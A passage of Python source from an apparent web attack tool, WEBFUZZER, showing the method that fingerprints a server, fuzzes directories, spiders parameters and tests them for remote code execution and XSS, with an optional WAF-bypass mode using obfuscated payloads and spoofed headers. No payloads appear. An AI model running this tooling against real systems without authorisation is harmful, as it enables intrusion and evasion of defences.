        self._opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))

        # fingerprint the server once (used to gate Windows-only payloads)
        _, _, base_headers = self._http(self._base)
        if WINDOWS_SERVER_RE.search(base_headers.get("Server", "")):
            self._windows_hint = True
        server_banner = base_headers.get("Server", "")

        print(f"\n{'='*60}")
        print(f"  WEBFUZZER — Directory Fuzzer & Parameter Spider")
        print(f"  Target: {self._base}")
        if server_banner:
            print(f"  Server: {server_banner[:60]}")
        if self._waf_bypass:
            print("  WAF bypass: ENABLED (obfuscated payloads + spoofed client headers)")
        print(f"{'='*60}\n")

        dirs_result: dict = {"found": [], "soft404": 0}
        spider: dict = {"pages": 0, "forms": [], "endpoints": []}

        if self.get_option("FUZZ_DIRS"):
            print("[Phase 1/4] Directory & file fuzzing...")
            dirs_result = self._fuzz_directories(self._base)
            print(f"  [+] {len(dirs_result['found'])} reachable paths "
                  f"({dirs_result['soft404']} soft-404 filtered)")

        if self.get_option("SPIDER"):
            print("\n[Phase 2/4] Parameter spider...")
            spider = self._spider_params(self._base)
            print(f"  [+] Crawled {spider['pages']} pages, {len(spider['forms'])} forms, "
                  f"{len(spider['endpoints'])} endpoints, "
                  f"{sum(len(e['params']) for e in spider['endpoints'])} params")

        findings: list[dict] = []
        if spider["endpoints"]:
            print("\n[Phase 3/4] RCE parameter testing...")
            print("[Phase 4/4] XSS parameter testing...")
            findings = self._test_parameters(self._base, spider["endpoints"])
            print(f"  [+] {len(findings)} injection findings "
                  f"({sum(1 for f in findings if f['type'] == 'rce')} RCE, "
                  f"{sum(1 for f in findings if f['type'] == 'xss')} XSS)")

        param_count = sum(len(e["params"]) for e in spider["endpoints"])
        rce_count = sum(1 for f in findings if f["type"] == "rce")
        xss_count = sum(1 for f in findings if f["type"] == "xss")

        print(f"\n{'='*60}")
        print(f"  WEBFUZZER SUMMARY")
        print(f"  Paths discovered:  {len(dirs_result['found'])}")
        print(f"  Soft-404 filtered: {dirs_result['soft404']}")
        print(f"  Pages crawled:     {spider['pages']}")
        print(f"  Params found:      {param_count}")
        print(f"  RCE findings:      {rce_count}")
        print(f"  XSS findings:      {xss_count}")
        print(f"{'='*60}\n")

        return {
            "target": self._base,
            "server": server_banner,
            "directories": dirs_result["found"],
            "spider": {
                "pages": spider["pages"],
                "forms": spider["forms"],
                "endpoints": spider["endpoints"],
                "param_count": param_count,
            },
            "findings": findings,
            "totals": {
                "dirs": len(dirs_result["found"]),
                "soft404": dirs_result["soft404"],
                "pages": spider["pages"],
                "forms": len(spider["forms"]),
                "endpoints": len(spider["endpoints"]),
                "params": param_count,
                "rce": rce_count,
                "xss": xss_count,
            },
        }

    def exploit(self) -> dict:
        return self.run()
